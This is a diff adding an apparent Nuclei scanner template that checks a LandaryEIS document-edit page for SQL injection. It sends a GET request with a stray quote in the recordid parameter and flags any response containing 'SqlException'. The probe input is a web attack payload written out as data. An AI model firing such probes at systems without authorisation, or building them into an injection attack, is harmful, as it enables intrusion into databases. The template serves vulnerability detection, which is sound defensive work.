@@ -1,0 +1,19 @@
+http:
+    - matchers:
+        - dsl:
+            - contains_all(body,"SqlException")
+          type: dsl
+      raw:
+        - |
+          GET /dossier/doc_fileedit_word.aspx?recordid=2015122918374828'&edittype=1,1 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+          Accept: */*
+id: landaryEIS-doc_fileedit_word-sqli
+info:
+    author: landaryEIS-doc_fileedit_word-sqli
+    name: landaryEIS-doc_fileedit_word-sqli
+    severity: high
+    tags:
+        - ecor
+        - ECOR
